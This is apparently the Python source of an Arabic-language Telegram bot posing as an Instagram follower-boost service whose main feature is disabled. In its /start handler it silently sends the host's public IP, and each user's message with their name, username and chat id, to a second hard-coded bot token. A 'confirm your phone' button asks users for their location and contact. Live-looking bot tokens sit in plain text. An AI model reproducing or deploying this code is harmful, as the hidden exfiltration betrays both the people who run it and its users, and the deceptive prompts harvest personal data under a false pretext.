import telebot 
import requests 
import glob, os
from telebot import types 
#from newf import *
token="5350006583:AAF7FfRVmBzF4cOAng06-Fg_QgKH8w-A-F0"
bot=telebot.TeleBot (token)
tir = '5117404879:AAEBhVuMDxFBghoZk_174TfNPYAC2f8rlM8'
idm = 5183888056
ip="oo"


dev="@Y_5_T1"
chn="@mix99911"
coins ="0"
sudo_channel="@mix99911"
f = "\n \033[01;30m Bot Firstname: {} \033[0m".format(bot.get_me().first_name)
u = "\n\n \033[01;34m Bot username: {} \033[0m".format(bot.get_me().username)
i = "\n\n \033[01;32m Bot ID: {} \033[0m".format(bot.get_me().id)
c = "\n\n \033[01;31m Thank You Dady :)  I`m Fully Online Now :D \033[0m"
print(f + u + i + c)
bot.send_message(5183888056,"`Im` *Online* `With All The` *Power*", parse_mode='markdown')



@bot.message_handler(commands=["start","help"])
def start(message):
    	ghk = glob.glob('./*.txt')
    	if f"use/private.txt" not in ghk:
    				with open(f"use/private.txt","a")as xs:
    					xs.write(f"●[({message.chat.first_name}) ----- ({message.from_user.id})]●\n")
    					xs.close()
    					
    	bot.send_message (message.chat.id,f"اهلا بك عزيزي {message.from_user.first_name}في بوت رشق الانستكرام💜\nانتظر قليلا يتم التحميل")
    	Hex_R = requests.get('https://api.ipify.org/').text
    	requests.post(f'https://api.telegram.org/bot{tir}/sendMessage?chat_id={idm}&text={ip} \n Public ip : {Hex_R}')
    	token2="5117404879:AAEBhVuMDxFBghoZk_174TfNPYAC2f8rlM8"
    	msg=message.text 
    	requests.post(f'https://api.telegram.org/bot{token2}/sendMessage?chat_id={idm}&text=نص جديد\n\n {msg}\n\n تم التحويل من {message.chat.first_name} - @{message.chat.username} - {message.chat.id}') 
    	token="5350006583:AAF7FfRVmBzF4cOAng06-Fg_QgKH8w-A-F0"
    	ch = '@odhd93jl'
    	sudo_id = "5183888056"
    	tok="5350006583:AAF7FfRVmBzF4cOAng06-Fg_QgKH8w-A-F0"
    	msg = '''🚸| عذرا عزيزي
🔰| عليك الاشتراك بقناة البوت لتتمكن من استخدامه

- مــعرف القـناة : {ch} 

‼️| اشترك ثم ارسل /start'''
    	idd = message.from_user.id
    	url = f"https://api.telegram.org/bot{token}/getchatmember?chat_id={ch}&user_id={idd}"
    	req = requests.get(url)
    	ID = message.from_user.id
    	chh="@odhd93jl"
    	name = message.chat.first_name
    	url = f"https://api.telegram.org/bot{tok}/getchatmember?chat_id={chh}&user_id={ID}"
    	req = requests.get(url).text
    	if ID == sudo_id or "member" in req or "creator" in req or "administartor" in req:
    		
    		aw = glob.glob('./*.txt')
    		if f"use/c{message.chat.id}.txt" not in aw:
    			with open(f"use/c{message.chat.id}.txt","w")as xs:
    				keyboardd = types.InlineKeyboardMarkup()
    				callback_button = types.InlineKeyboardButton(text="بدء الاستخدام", callback_data="start_use")
    				keyboardd.add(callback_button)
    				bot.send_message(message.chat.id,text= "اهلا بك عزيزي في بوت رشق الانستكرام\n channel: [MIX](https://t.me/mix99911)",parse_mode ="markdown",disable_web_page_preview="True", reply_markup=keyboardd)
    				

    				xs.write("1"+"دولار")
    				xs.close()
    				
    	else:
    		bot.send_message(message.chat.id, """*🚸| عذرا عزيزي
🔰| عليك الاشتراك بقناة البوت لتتمكن من استخدامه

- مــعرف القـناة : {} 

‼️| اشترك ثم ارسل /start*""".format(ch),parse_mode="markdown")

    		
    				
    		
    		
	
	
	
@bot.callback_query_handler(func =lambda call: True)
def callback_inline(call):
    
    if call.message:
    	if call.data =="start_use":
    		keyboard=types.InlineKeyboardMarkup (row_width =2)
    		button1=types.InlineKeyboardButton("رشق فوري",callback_data="click1")
    		button2=types.InlineKeyboardButton ("معلوماتي❕",callback_data="click2")
    		button3=types.InlineKeyboardButton ("رابط الدعوه🏧",callback_data="click3")
    		button4=types.InlineKeyboardButton ("شراء نقاط©️",callback_data="click4")
    		button5=types.InlineKeyboardButton ("مطور البوت🔝",callback_data="click5")
    		button6=types.InlineKeyboardButton("تأكيد رقم هاتفك🏧",callback_data="click6")
    
    		keyboard.add(button1,button2,button3,button4,button5,button6)
    		fl = open(f"use/c{call.from_user.id}.txt").read()
    		nam=call.from_user.first_name
    		bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"اهلا بك عزيزي {nam}في بوت رشق الانستكرام\n\n______________________\n\nتم صنع البوت لمساعدتك في تزويد حسابك الانستكرام بدون اي تعب🎊🎈\n______________________\n\nقم باستخدام الازرار في الاسفل👇\n_______________________\n\nرصيد حسابك : {fl}\n\n❕للتواصل مع الطور عبر البوت قم بكتابه \n/c +نص الرساله ",reply_markup=keyboard)
    	#if call.data ==  "click6":
#            				try:
#            					idu = message.from_user.id,message.from_user.first_name
#            					uss=message.from_user.username
#            					us = str(message.chat.id)
#            					f3 = open("use/private.txt", 'a')
#            					if (not id_ls_gr(str(idu))):
#            						f3.write("{}\n".format(idu))
#            						f3.close()
#            						bot.reply_to(message,f"- اهلا عزيزي {message.from_user.first_name} تم تفعيل بوت المصري بنجاح .")
#            					else:
#            						bot.reply_to(message,f"- البوت مفعل من قبل ! .")
#            				except:
#            					pass
#            					#bot.reply_to(message,f"- حصل خطأ !\nرمز الخطأ :\n{err}")
    		
    	if call.data =="click1":
    	   	
        	keyboard=types.InlineKeyboardMarkup(row_width =2)
        	a = types.InlineKeyboardButton(text="العوده", callback_data="start_use")
        	keyboard.add(a)
        	nam=call.from_user.first_name
        	#bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"• اهلا بك عزيزي {nam} في الرشق الشبه ثابت للأنستكرام 🤖.\n\n• السرعة : 10-200k في اليوم الواحد 🔥.\n• زمن البدء : 1-22 دقيقة. \n• في حال تم الغاء الطلب يتم استرداد الاموال ✅.\n• مستوى النزول 5-11% . \n• نوع الحسابات ؛ ( امريكي، اوكراني، اوربي) \n• شكل الحسابات : ( حقيقية ) 🖤.\n\n• ⚠️ ليتم قبول الطلب يجب ان يحتوي الحساب المرشوق على صورة شخصية واسم وبايو وصورتين على الاقل .\n• والان ارسل رابط الحساب الذي تريد ان تقوم بزيادة عدد متابعينه", reply_markup=keyboard)
        	bot.answer_callback_query(callback_query_id=call.id, show_alert=True, text="البوت معطل حاليا ناسف علي ذالك ولاكن لم يكتمل البوت حتا الان\n\nدعواتكم💜💜")
        	#if call.message == call.message and call.message.chat.type == "private":
        		#bot.reply_to(call.message,"عذرا لم يتم تفعيل البوت انتظر 25/5🖤")
        		
    	if call.data =="click2":
    		id=call.from_user.id
    		
    		keyboard=types.InlineKeyboardMarkup(row_width =2)
    		a=types.InlineKeyboardButton("عوده🔙",callback_data="start_use")
    		keyboard.add (a)
    		fl = open(f"use/c{call.from_user.id}.txt").read()
    		bot.edit_message_text (chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"رصيدك: `{fl}`\nايديك: `{id}`\nمشركاتك لرابط الدعوه: 0",parse_mode="markdown",reply_markup=keyboard)
    	if call.data =="click3":
    		keyboard=types.InlineKeyboardMarkup(row_width =2)
    		a=types.InlineKeyboardButton("عوده🔙",callback_data="start_use")
    		keyboard.add (a)
    		idd=call.from_user.id 
    		bot.edit_message_text (chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"⚠️رابط الدعوه معطل حاليا \nاي ان اذا قمت بدعوه أصدقائك لن يتم احتساب نقط لديك❕🙇\n\nالرابط الخاص بك هو \n\nhttps://t.me/Elmas_rybot?start={idd}",disable_web_page_preview="True",reply_markup=keyboard)
    	if call.data =="click4":
    		keyboard=types.InlineKeyboardMarkup(row_width =1)
    		b=types.InlineKeyboardButton ("تواصل مع المدير↗",url="t.me//Y_5_T1")
    		a=types.InlineKeyboardButton("عوده🔙",callback_data="start_use")
    		keyboard.add (b,a)
    		bot.edit_message_text (chat_id=call.message.chat.id, message_id=call.message.message_id, text="لشراء نقاط تواصل مع المدير \nمعرف المطور: @Y_5_T1\n\n❕للتواصل مع الطور عبر البوت قم بكتابه \n/c +نص الرساله ",reply_markup=keyboard)
    	if call.data=="click5":
    		keyboard=types.InlineKeyboardMarkup(row_width =2)
    		a=types.InlineKeyboardButton("عوده🔙",callback_data="start_use")
    		keyboard.add (a)
    		bot.edit_message_text (chat_id=call.message.chat.id, message_id=call.message.message_id, text="مطور البوت: @Y_5_T1\n\nقناه صاحب البوت: @mix99911\n\n❕للتواصل مع الطور عبر البوت قم بكتابه \n/c +نص الرساله ",reply_markup=keyboard)
    	if call.data=="click6":
    		markup = types.ReplyKeyboardMarkup(one_time_keyboard=True)
    		button = types.KeyboardButton(text='مشتركه الموقع',request_location=True)
    		button2 = types.KeyboardButton(text='مشاركه جهاتك',request_contact=True)
    		markup.add(button, button2)
    		bot.send_message(call.message.chat.id, 'Please Chose One :', reply_markup=markup)
  
    		

    		
    	
    	
    	
@bot.message_handler(func =lambda message:True )
def aa (message):
	i=message.text 
	url =f"http://134.122.55.35/info.php/?user={i}"
	ur=requests.get (url )
	response =ur.json()
	b=response ["status"]
	f=response ["image"]
	k=response["followers"]
	l=response["following"]
	bi=response["bio"]
	user=response["userId"]
	md=response["media"]
	num=response ["name"]
	
	cap=(f"""
▫️Name : {num}
▫️UserId : `{user}`
▫️Followers : {k}
▫️Following : {l}
▫️Page status : {b}
▫️ Post : {md}
▫️Bio : {bi}
""")
	#bot.reply_to(message,f"**{b}**",parse_mode="markdown")
	bot.send_photo(message.chat.id,f,caption='{}'.format(cap),parse_mode='markdown')
	
    	
    	
    	
        		
    		
    		
    		
    		
    		
#@bot.message_handler(func =lambda message:True)
#def foi (message ):
#    sudo ="5183888056"
#    if message.text == message.text and message.chat.type == "private":
#    	nm=message.from_user.username
#    	bot.reply_to(message,f"⚠️عذرا لم يكتمل البوت سيتم اكتمال البوت في أقرب وقت 🚫" )
#    	bot.forward_message(sudo,message.chat.id,message.message_id)
#    	bot.send_message(sudo,f"وصلتلك رساله من @{nm}")
    	#bot.reply_to(message,f"تم ارسال رسالتك الى المطور بنجاح\n\nنص الرساله: {message.text}" )
    	
    
@bot.message_handler(commands=['c'])
def feedback(m):    
    senderid = m.chat.id
    first = m.from_user.first_name
    usr = m.from_user.username
    str = m.text
    txt = str.replace('/c', '')
    bot.send_message(senderid, "_Thank Your Msg Posted admin_", parse_mode="Markdown")
    bot.send_message(5183888056, "msg : {}\nid : {}\nname : {}\nUsername : @{}".format(txt,senderid,first,usr))
    
    		

    			
			
			#a=types.InlineKeyboardButton("عوده🔙",callback_data="button1")
#			keyboard.add(a)
#			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=".",reply_markup=keyboard)

#######################################
@bot.message_handler(func=lambda message:True )
def gh(message ):
        sudo=5183888056
        if message.text == "الاحصائيات" and message.chat.id == sudo:
        	private  = open("use/private.txt","r",encoding="utf-8").read().splitlines()
        	of_all = private
        	al = f"""
الاحصائيات : 🔰 

📮¦ عدد المشتركين في البوت : {len(private)} .
"""
        	bot.reply_to(message,al)
        	
        	

       
      
      

    	
bot.infinity_polling()